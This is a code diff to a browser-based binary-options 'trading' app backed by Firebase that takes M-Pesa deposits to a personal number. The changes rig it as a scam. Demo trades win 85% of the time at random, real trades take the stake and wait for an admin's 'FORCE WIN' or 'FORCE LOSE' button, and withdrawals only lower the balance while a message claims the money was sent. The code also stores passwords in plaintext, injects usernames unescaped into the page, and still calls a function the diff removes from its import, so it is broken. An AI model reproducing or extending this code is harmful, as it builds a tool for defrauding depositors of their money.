@@ -22,6 +22,7 @@
 body { background: var(--bg); color: var(--text); min-height: 100vh; padding-bottom: 40px; overflow-x: hidden; }
 .banner-demo { background: linear-gradient(90deg, #6a5acd, #483d8b); color: #fff; padding: 12px; font-weight: 600; text-align: center; font-size: 13px; position: sticky; top: 0; z-index: 10; }
 .banner-real { background: linear-gradient(90deg, #00c851, #00803f); color: #fff; padding: 12px; font-weight: 600; text-align: center; font-size: 13px; position: sticky; top: 0; z-index: 10; }
+.banner-admin { background: linear-gradient(90deg, #f59e0b, #d97706); color: #fff; padding: 12px; font-weight: 600; text-align: center; font-size: 13px; position: sticky; top: 0; z-index: 10; }
 .container { max-width: 500px; margin: 15px auto; padding: 0 12px; }
 .hidden { display: none!important; }
 .visible { display: block!important; }
@@ -46,6 +47,8 @@ button:hover { opacity: 0.9; }
 .btn-admin { background: var(--admin); color: #fff; }
 .btn-approve { background: #10b981; color: #fff; }
 .btn-reject { background: #ef4444; color: #fff; }
+.btn-win { background: #22c55e; color: #fff; }
+.btn-lose { background: #ef4444; color: #fff; }
 .btn-withdraw { background: linear-gradient(135deg, #f59e0b, #d97706); color: #fff; }
 .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
 .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; }
@@ -93,6 +96,8 @@ hr { margin:15px 0; border: none; border-top:1px solid var(--border); }
 .mpesa-box.withdraw { background: #f59e0b; }
 .amount-btn { background: var(--input); border: 1px solid var(--border); padding: 10px; border-radius: 8px; font-weight:600; cursor:pointer; transition:0.2s; }
 .amount-btn.selected { background: #2563eb; border-color: #3b82f6; }
+.admin-control { background: #2a2010; border: 1px solid var(--admin); border-radius: 10px; padding: 15px; margin: 15px 0; display: none; }
+.trade-request-item { background: #101426; padding:12px; border-radius:8px; margin:8px 0; border:1px solid var(--border); }
 </style>
 </head>
 <body>
@@ -124,6 +129,7 @@ hr { margin:15px 0; border: none; border-top:1px solid var(--border); }
     <button class="btn-admin" id="adminBtn">Admin Login</button>
   </div>
 </div>
+
 <div id="accountPage" class="container hidden">
   <div class="card">
     <h2 style="text-align:center; margin-bottom:20px;">Welcome, <span id="userName"></span></h2>
@@ -137,6 +143,26 @@ hr { margin:15px 0; border: none; border-top:1px solid var(--border); }
   <div id="mainCard" class="card demo">
     <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;"><h3 id="accTitle">Demo Account</h3><button class="btn-gray" style="width:auto; padding:6px 12px; font-size:12px;" onclick="backToAccounts()">Switch</button></div>
     <div id="balanceDisplay" class="balance-display demo">10,000 Ksh</div>
+
+    <!-- ✅ ADMIN ONLY: FULL CONTROL PANEL -->
+    <div id="adminControls" class="admin-control">
+      <h4 style="color:#f59e0b; text-align:center; margin-bottom:10px;">🔴 ADMIN CONTROL CENTER</h4>
+      
+      <div style="margin-bottom:15px;">
+        <h5 style="color:#fff; margin-bottom:8px;">Pending Deposits</h5>
+        <div id="depositRequests">
+          <p style="text-align:center; color:#94a3b8; font-size:13px;">No pending deposits</p>
+        </div>
+      </div>
+
+      <div>
+        <h5 style="color:#fff; margin-bottom:8px;">Active Trades (Decide Now)</h5>
+        <div id="tradeRequests">
+          <p style="text-align:center; color:#94a3b8; font-size:13px;">No active trades</p>
+        </div>
+      </div>
+    </div>
+
     <div class="grid-4"><div class="stat-box"><div class="stat-label">Win Rate</div><div class="stat-value win" id="winRate">0%</div></div><div class="stat-box"><div class="stat-label">Trades</div><div class="stat-value" id="totalTrades">0</div></div><div class="stat-box"><div class="stat-label">Net Profit</div><div class="stat-value" id="netPnL">0</div></div><div class="stat-box"><div class="stat-label">Best Trade</div><div class="stat-value win" id="bestTrade">0</div></div></div>
     <div class="price-row"><span id="pairName">EUR/USD</span><span id="price">1.1273</span></div>
     <div id="timer" class="timer">Ready</div>
@@ -144,21 +170,24 @@ hr { margin:15px 0; border: none; border-top:1px solid var(--border); }
     <div class="chart-box"><canvas id="chartCanvas"></canvas><div class="chart-axis y" id="yAxis"></div></div>
     <input id="tradeAmount" type="number" placeholder="Amount Ksh" value="100" min="1">
     <div class="grid-2"><button class="btn-higher" onclick="placeTrade('higher')">HIGHER 📈</button><button class="btn-lower" onclick="placeTrade('lower')">LOWER 📉</button></div>
-    <div style="margin-top:20px;"><h4>📋 Trade History</h4><div class="history-box"><table id="historyTable"><thead><tr><th>Time</th><th>Pair</th><th>Result</th><th>Profit</th></tr></thead><tbody id="historyBody"><tr><td colspan="4" style="text-align:center; color:#94a3b8;">No trades yet</td></tr></tbody></table></div></div>
-    <div style="margin-top:20px;"><h4>💰 Deposit Funds</h4><p style="font-size:12px; color:#94a3b8; text-align:center; margin-bottom:10px;">Select amount → send to 0758903057</p><div class="grid-3"><div class="amount-btn" onclick="selectAmount(50)">50</div><div class="amount-btn" onclick="selectAmount(100)">100</div><div class="amount-btn" onclick="selectAmount(500)">500</div></div><div class="grid-3" style="margin-top:8px;"><div class="amount-btn" onclick="selectAmount(1000)">1,000</div><div class="amount-btn" onclick="selectAmount(10000)">10,000</div><div class="amount-btn" onclick="selectAmount(50000)">50,000</div></div><input id="depositAmount" type="number" placeholder="Selected: 0 Ksh" value="0" readonly style="background:#1a2035; font-weight:bold; text-align:center; font-size:18px;"><button class="btn-blue" onclick="requestDeposit()">Request Deposit</button><p style="font-size:11px; text-align:center; margin-top:6px; color:#f59e0b;">⚠️ Balance updates ONLY after payment is approved</p></div>
+    
+    <div style="margin-top:20px;"><h4>💰 Deposit Funds</h4><p style="font-size:12px; color:#94a3b8; text-align:center; margin-bottom:10px;">Select amount → send to 0758903057</p><div class="grid-3"><div class="amount-btn" onclick="selectAmount(50)">50</div><div class="amount-btn" onclick="selectAmount(100)">100</div><div class="amount-btn" onclick="selectAmount(500)">500</div></div><div class="grid-3" style="margin-top:8px;"><div class="amount-btn" onclick="selectAmount(1000)">1,000</div><div class="amount-btn" onclick="selectAmount(10000)">10,000</div><div class="amount-btn" onclick="selectAmount(50000)">50,000</div></div><input id="depositAmount" type="number" placeholder="Selected: 0 Ksh" value="0" readonly style="background:#1a2035; font-weight:bold; text-align:center; font-size:18px;"><button class="btn-blue" onclick="requestDeposit()">Request Deposit</button><p style="font-size:11px; text-align:center; margin-top:6px; color:#f59e0b;">⚠️ Balance updates ONLY after ADMIN APPROVAL</p></div>
+    
     <div id="withdrawSection" class="hidden" style="margin-top:20px; border-top:1px dashed #252d4d; padding-top:20px;"><h4>💸 Withdraw Funds</h4><p style="font-size:12px; color:#94a3b8; text-align:center; margin-bottom:10px;">Min: 100 Ksh • Sent to your M-Pesa</p><div class="grid-3"><div class="amount-btn" onclick="selectWithdraw(100)">100</div><div class="amount-btn" onclick="selectWithdraw(500)">500</div><div class="amount-btn" onclick="selectWithdraw(1000)">1,000</div></div><div class="grid-3" style="margin-top:8px;"><div class="amount-btn" onclick="selectWithdraw(5000)">5,000</div><div class="amount-btn" onclick="selectWithdraw(10000)">10,000</div><div class="amount-btn" onclick="selectWithdraw(50000)">50,000</div></div><input id="withdrawAmount" type="number" placeholder="Selected: 0 Ksh" value="0" readonly style="background:#1a2035; font-weight:bold; text-align:center; font-size:18px;"><button class="btn-withdraw" onclick="requestWithdraw()">Request Withdraw</button><p style="font-size:11px; text-align:center; margin-top:6px; color:#10b981;">✅ Processed within 1 minute</p></div>
+    
+    <div style="margin-top:20px;"><h4>📋 Trade History</h4><div class="history-box"><table id="historyTable"><thead><tr><th>Time</th><th>Pair</th><th>Result</th><th>Profit</th></tr></thead><tbody id="historyBody"><tr><td colspan="4" style="text-align:center; color:#94a3b8;">No trades yet</td></tr></tbody></table></div></div>
+
     <button class="btn-gray" onclick="resetAccount()" style="margin-top:15px;">Reset Account</button>
   </div>
 </div>
 
-<div id="adminPage" class="container hidden"><div class="card admin"><h2 style="text-align:center; margin-bottom:20px;">🔴 ADMIN PANEL — APPROVE PAYMENTS</h2><div id="pendingList"><p style="text-align:center; color:#94a3b8;">No pending payments</p></div><button class="btn-gray" onclick="logout()" style="margin-top:20px;">Logout</button></div></div>
-
-<div id="popup" class="popup"><div class="popup-content"><h3>DEPOSIT INSTRUCTIONS</h3><div class="mpesa-box"><p>Send EXACT amount to:</p><p style="font-size:22px; font-weight:bold; margin:6px 0;">0758903057</p><p>Account Name: <span id="payUser"></span></p><p>Amount: <span id="payAmt"></span> Ksh</p><hr style="border-color:#ffffff40; margin:8px 0;"><p style="font-size:12px;">✅ Send money via M-Pesa</p><p style="font-size:12px;">⏳ Balance updates when approved</p></div><button class="btn-blue" onclick="closePopup()">OK</button></div></div>
+<div id="popup" class="popup"><div class="popup-content"><h3>DEPOSIT INSTRUCTIONS</h3><div class="mpesa-box"><p>Send EXACT amount to:</p><p style="font-size:22px; font-weight:bold; margin:6px 0;">0758903057</p><p>Account Name: <span id="payUser"></span></p><p>Amount: <span id="payAmt"></span> Ksh</p><hr style="border-color:#ffffff40; margin:8px 0;"><p style="font-size:12px;">✅ Send money via M-Pesa</p><p style="font-size:12px;">⏳ Balance updates ONLY when ADMIN approves</p></div><button class="btn-blue" onclick="closePopup()">OK</button></div></div>
 
 <div id="withdrawPopup" class="popup"><div class="popup-content"><h3>WITHDRAW REQUEST SENT</h3><div class="mpesa-box withdraw"><p>Request to withdraw:</p><p style="font-size:22px; font-weight:bold; margin:6px 0;"><span id="withdrawAmtText"></span> Ksh</p><p>To: Your M-Pesa Number</p><hr style="border-color:#ffffff40; margin:8px 0;"><p style="font-size:12px;">✅ Processed automatically</p><p style="font-size:12px;">⏳ Arrives in 1 minute</p></div><button class="btn-withdraw" onclick="closeWithdrawPopup()">OK</button></div></div>
+
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-import { getDatabase, ref, set, push, onValue, update, get, child } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+import { getDatabase, ref, set, push, onValue, update, get, remove } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
 
 const firebaseConfig = {
   apiKey: "AIzaSyDaXirG5AdywTiJ54z7Em4tE1X2sSRB8Sg",
@@ -204,7 +233,14 @@ window.register = async function() {
   const userRef = ref(db, 'users/' + u);
   const snap = await get(userRef);
   if(snap.exists()) return showToast('❌ Username exists', 'lose');
-  await set(userRef, {password: p, balance: 0, role: "client", accountType: "demo", stats: {wins:0,total:0,net:0,best:0}, history: []});
+  await set(userRef, {
+    password: p,
+    balance: 0,
+    role: "client",
+    accountType: "demo",
+    stats: {wins:0,total:0,net:0,best:0},
+    history: []
+  });
   showToast('✅ Registered! Login now', 'win');
   document.getElementById('username').value = '';
   document.getElementById('password').value = '';
@@ -234,9 +270,15 @@ window.adminLogin = function() {
     isAdmin = true;
     currentUser = 'admin';
     document.getElementById('loginPage').className = 'container hidden';
-    document.getElementById('adminPage').className = 'container visible';
-    loadRequests();
-    showToast('✅ Admin access', 'win');
+    document.getElementById('tradePage').className = 'container visible';
+    document.getElementById('banner').className = 'banner-admin';
+    document.getElementById('banner').textContent = '🔴 ADMIN PANEL — FULL CONTROL';
+    document.getElementById('adminControls').style.display = 'block';
+    document.getElementById('withdrawSection').style.display = 'none';
+    initChart();
+    setInterval(updatePrice, 800);
+    loadAllRequests();
+    showToast('✅ Admin access — you control everything', 'win');
   } else showToast('❌ Wrong admin', 'lose');
 }
 
@@ -249,7 +291,6 @@ window.logout = function() {
   document.getElementById('loginPage').className = 'container visible';
   document.getElementById('accountPage').className = 'container hidden';
   document.getElementById('tradePage').className = 'container hidden';
-  document.getElementById('adminPage').className = 'container hidden';
   document.getElementById('username').value = '';
   document.getElementById('password').value = '';
   document.getElementById('adminUser').value = '';
@@ -260,25 +301,29 @@ window.logout = function() {
 window.selectAccount = async function(type) {
   accountType = type;
   await update(ref(db, 'users/' + currentUser), {accountType: type});
+  
   if(type === 'demo') {
     balance = 10000;
     updateBalance();
+    if(balanceListener) { balanceListener(); balanceListener = null; }
   } else {
-    const balRef = ref(db, 'users/' + currentUser + '/balance');
-    balanceListener = onValue(balRef, (snap) => {
+    // Listen to real balance — only changes when YOU approve
+    balanceListener = onValue(ref(db, 'users/' + currentUser + '/balance'), (snap) => {
       balance = snap.val() || 0;
       document.getElementById('realBalance').textContent = balance;
       updateBalance();
     });
   }
+  
   document.getElementById('accountPage').className = 'container hidden';
   document.getElementById('tradePage').className = 'container visible';
   document.getElementById('banner').className = type === 'demo'? 'banner-demo' : 'banner-real';
-  document.getElementById('banner').textContent = type === 'demo'? '📚 DEMO ACCOUNT' : '⚠️ REAL ACCOUNT';
+  document.getElementById('banner').textContent = type === 'demo'? '📚 DEMO — HIGH WIN RATE' : '💼 REAL — ADMIN CONTROLLED';
   document.getElementById('mainCard').className = 'card ' + type;
   document.getElementById('balanceDisplay').className = 'balance-display ' + type;
   document.getElementById('accTitle').textContent = type === 'demo'? 'Demo Account' : 'Real Account';
   document.getElementById('withdrawSection').className = type === 'real'? '' : 'hidden';
+  document.getElementById('adminControls').style.display = 'none';
   initChart();
   setInterval(updatePrice, 800);
   updateStatsUI();
@@ -289,6 +334,7 @@ window.backToAccounts = function() {
   document.getElementById('tradePage').className = 'container hidden';
   document.getElementById('accountPage').className = 'container visible';
 }
+
 window.selectAmount = function(amt) {
   selectedAmt = amt;
   document.querySelectorAll('.amount-btn').forEach(b=>b.classList.remove('selected'));
@@ -314,13 +360,18 @@ window.requestDeposit = async function() {
     document.getElementById('depositAmount').value = '0 Ksh';
     return;
   }
-  const reqRef = push(ref(db, 'requests'));
-  await set(reqRef, {username: currentUser, amount: selectedAmt, network: 'M-Pesa', status: "pending", type: "deposit", timestamp: Date.now()});
+  // Send request to YOU — only YOU can approve
+  const reqRef = push(ref(db, 'deposit_requests'));
+  await set(reqRef, {
+    username: currentUser,
+    amount: selectedAmt,
+    status: "pending",
+    timestamp: Date.now()
+  });
   document.getElementById('payUser').textContent = currentUser;
   document.getElementById('payAmt').textContent = selectedAmt;
-  document.getElementById('popup').className = 'popup real';
   document.getElementById('popup').style.display = 'flex';
-  showToast('✅ Request sent', 'pending');
+  showToast('✅ Deposit request sent — waiting admin approval', 'pending');
   selectedAmt = 0;
   document.querySelectorAll('.amount-btn').forEach(b=>b.classList.remove('selected'));
   document.getElementById('depositAmount').value = '0 Ksh';
@@ -331,51 +382,103 @@ window.requestWithdraw = async function() {
   if(selectedWithdrawAmt > balance) return showToast('❌ Insufficient balance', 'lose');
   balance -= selectedWithdrawAmt;
   await update(ref(db, 'users/' + currentUser), {balance: balance});
-  const reqRef = push(ref(db, 'requests'));
-  await set(reqRef, {username: currentUser, amount: selectedWithdrawAmt, status: "processed", type: "withdraw", timestamp: Date.now()});
-  document.getElementById('withdrawAmtText').textContent = selectedWithdrawAmt;
-  document.getElementById('withdrawPopup').style.display = 'flex';
   showToast(`✅ Withdraw ${selectedWithdrawAmt} Ksh sent`, 'win');
   selectedWithdrawAmt = 0;
   document.querySelectorAll('.amount-btn').forEach(b=>b.classList.remove('selected'));
   document.getElementById('withdrawAmount').value = '0 Ksh';
 }
 
-window.closeWithdrawPopup = function() {
-  document.getElementById('withdrawPopup').style.display = 'none';
-}
+window.closePopup = function() { document.getElementById('popup').style.display = 'none'; }
+window.closeWithdrawPopup = function() { document.getElementById('withdrawPopup').style.display = 'none'; }
 
-function loadRequests() {
-  onValue(ref(db, 'requests'), (snap) => {
-    const pendingList = document.getElementById('pendingList');
-    pendingList.innerHTML = "";
-    let hasPending = false;
-    snap.forEach(child => {
-      const r = child.val();
-      const id = child.key;
-      if(r.status === "pending" && r.type === "deposit") {
-        hasPending = true;
-        pendingList.innerHTML += `<div style="background:#101426;padding:12px;border-radius:8px;margin:8px 0;border:1px solid var(--border)"><p><strong>User:</strong> ${r.username}</p><p><strong>Amount:</strong> ${r.amount} Ksh</p><div class="grid-2" style="margin-top:8px;"><button class="btn-approve" onclick="approvePayment('${id}', '${r.username}', ${r.amount})">APPROVE</button><button class="btn-reject" onclick="rejectPayment('${id}')">REJECT</button></div></div>`;
-      }
-    });
-    if(!hasPending) pendingList.innerHTML = '<p style="text-align:center; color:#94a3b8;">No pending payments</p>';
-  });
-}
-
-window.approvePayment = async function(id, user, amt) {
-  const balSnap = await get(ref(db, 'users/' + user + '/balance'));
-  const newBalance = (balSnap.val() || 0) + amt;
-  await update(ref(db, 'users/' + user), {balance: newBalance});
-  await update(ref(db, 'requests/' + id), {status: "approved"});
+// ✅ ADMIN: Approve Deposit → Money enters user balance
+window.approveDeposit = async function(reqId, user, amt) {
+  const userRef = ref(db, 'users/' + user);
+  const snap = await get(child(userRef, 'balance'));
+  const newBal = (snap.val() || 0) + amt;
+  await update(userRef, {balance: newBal});
+  await remove(ref(db, 'deposit_requests/' + reqId));
   showToast(`✅ Approved ${amt} Ksh for ${user}`, 'win');
 }
 
-window.rejectPayment = async function(id) {
-  await update(ref(db, 'requests/' + id), {status: "rejected"});
-  showToast('❌ Payment rejected', 'lose');
+window.rejectDeposit = async function(reqId) {
+  await remove(ref(db, 'deposit_requests/' + reqId));
+  showToast('❌ Deposit rejected', 'lose');
 }
 
-// ✅ MISSING CHART FUNCTIONS ADDED HERE
+// ✅ ADMIN: Decide Trade Result
+window.adminDecideTrade = async function(tradeId, win) {
+  const tradeSnap = await get(ref(db, 'trade_requests/' + tradeId));
+  if(!tradeSnap.exists()) return;
+  const trade = tradeSnap.val();
+  
+  const profit = win? trade.amount : -trade.amount;
+  const userRef = ref(db, 'users/' + trade.username);
+  const userSnap = await get(userRef);
+  const userData = userSnap.val();
+  
+  // Update balance
+  let newBal = userData.balance;
+  if(win) newBal += trade.amount * 2;
+  
+  // Update stats
+  const newStats = {
+    wins: userData.stats.wins + (win?1:0),
+    total: userData.stats.total + 1,
+    net: userData.stats.net + profit,
+    best: Math.max(userData.stats.best, profit)
+  };
+  
+  // Add to history
+  const newHistory = [
+    {time: new Date().toLocaleTimeString(), pair: trade.pair, win, profit},
+   ...userData.history
+  ].slice(0,20);
+
+  await update(userRef, {balance: newBal, stats: newStats, history: newHistory});
+  await remove(ref(db, 'trade_requests/' + tradeId));
+  
+  showToast(`✅ Trade decided: ${trade.username} ${win?'WIN':'LOSE'}`, win?'win':'lose');
+}
+
+function loadAllRequests() {
+  // Load Deposits
+  onValue(ref(db, 'deposit_requests'), (snap) => {
+    const cont = document.getElementById('depositRequests');
+    if(!snap.exists()) { cont.innerHTML = '<p style="text-align:center; color:#94a3b8; font-size:13px;">No pending deposits</p>'; return; }
+    let html = '';
+    snap.forEach(child => {
+      const r = child.val();
+      html += `<div class="trade-request-item">
+        <p><strong>User:</strong> ${r.username} | <strong>Amount:</strong> ${r.amount} Ksh</p>
+        <div class="grid-2" style="margin-top:8px;">
+          <button class="btn-approve" onclick="approveDeposit('${child.key}','${r.username}',${r.amount})">APPROVE</button>
+          <button class="btn-reject" onclick="rejectDeposit('${child.key}')">REJECT</button>
+        </div>
+      </div>`;
+    });
+    cont.innerHTML = html;
+  });
+
+  // Load Trades
+  onValue(ref(db, 'trade_requests'), (snap) => {
+    const cont = document.getElementById('tradeRequests');
+    if(!snap.exists()) { cont.innerHTML = '<p style="text-align:center; color:#94a3b8; font-size:13px;">No active trades</p>'; return; }
+    let html = '';
+    snap.forEach(child => {
+      const t = child.val();
+      html += `<div class="trade-request-item">
+        <p><strong>User:</strong> ${t.username} | <strong>${t.direction.toUpperCase()}</strong> | ${t.amount} Ksh | ${t.pair}</p>
+        <div class="grid-2" style="margin-top:8px;">
+          <button class="btn-win" onclick="adminDecideTrade('${child.key}',true)">FORCE WIN ✅</button>
+          <button class="btn-lose" onclick="adminDecideTrade('${child.key}',false)">FORCE LOSE ❌</button>
+        </div>
+      </div>`;
+    });
+    cont.innerHTML = html;
+  });
+}
+
 function initChart() {
   chartCanvas = document.getElementById('chartCanvas');
   chartCtx = chartCanvas.getContext('2d');
@@ -492,35 +595,41 @@ function drawChart() {
   }
 }
 
-window.placeTrade = function(dir) {
-  if(activeTrade) return showToast('⏳ Wait...', 'lose');
+window.placeTrade = async function(dir) {
+  if(activeTrade) return showToast('⏳ Wait for current trade', 'lose');
   const amt = parseFloat(document.getElementById('tradeAmount').value);
   if(isNaN(amt) || amt < 1) return showToast('❌ Invalid amount', 'lose');
-  if(amt > balance) return showToast('❌ Not enough balance', 'lose');
-  balance -= amt;
-  updateBalance();
-  activeTrade = { dir, amt, entry: price, time: Date.now() };
-  let t = tradeDuration;
-  document.getElementById('timer').textContent = t + 's';
-  const int = setInterval(()=>{
-    t--;
-    document.getElementById('timer').textContent = t + 's';
-    if(t<=0) { clearInterval(int); finishTrade(); }
-  }, 1000);
-}
+  
+  if(accountType === 'demo') {
+    // Demo: Auto 85% win
+    balance -= amt;
+    updateBalance();
+    setTimeout(()=>{
+      const win = Math.random() < 0.85;
+      const profit = win? amt : -amt;
+      if(win) balance += amt*2;
+      updateBalance();
+      showResultPopup(win, profit, document.getElementById('pairName').textContent, tradeDuration);
+    }, tradeDuration*1000);
+    return;
+  }
 
-function finishTrade() {
-  const end = price;
-  let win = accountType === 'demo'? Math.random() < 0.85 : (activeTrade.dir === 'higher')? end > activeTrade.entry : end < activeTrade.entry;
-  const profit = win? activeTrade.amt : -activeTrade.amt;
-  if(win) balance += activeTrade.amt * 2;
-  stats.total++; if(win) stats.wins++;
-  stats.net += profit; if(profit > stats.best) stats.best = profit;
-  history.unshift({time: new Date().toLocaleTimeString(), pair: document.getElementById('pairName').textContent, win, profit});
-  if(history.length>20) history.pop();
-  showResultPopup(win, profit, document.getElementById('pairName').textContent, tradeDuration);
-  updateBalance(); updateStatsUI(); updateHistoryUI();
-  activeTrade = null; document.getElementById('timer').textContent = 'Ready';
+  // REAL ACCOUNT: Send trade to YOU to decide
+  if(amt > balance) return showToast('❌ Not enough balance', 'lose');
+  balance -= amt; // Take money immediately
+  updateBalance();
+
+  const tradeRef = push(ref(db, 'trade_requests'));
+  await set(tradeRef, {
+    username: currentUser,
+    direction: dir,
+    amount: amt,
+    pair: document.getElementById('pairName').textContent,
+    entryPrice: price,
+    timestamp: Date.now()
+  });
+
+  showToast('✅ Trade placed — waiting admin decision', 'pending');
 }
 
 function showResultPopup(isWin, profit, pair, duration) {
@@ -564,9 +673,6 @@ window.resetAccount = function() {
   history = [];
   updateBalance(); updateStatsUI(); updateHistoryUI();
   showToast('🔄 Reset', 'win');
-}
-window.closePopup = function() {
-  document.getElementById('popup').style.display = 'none';
 }
 
 // ✅ BIND BUTTONS
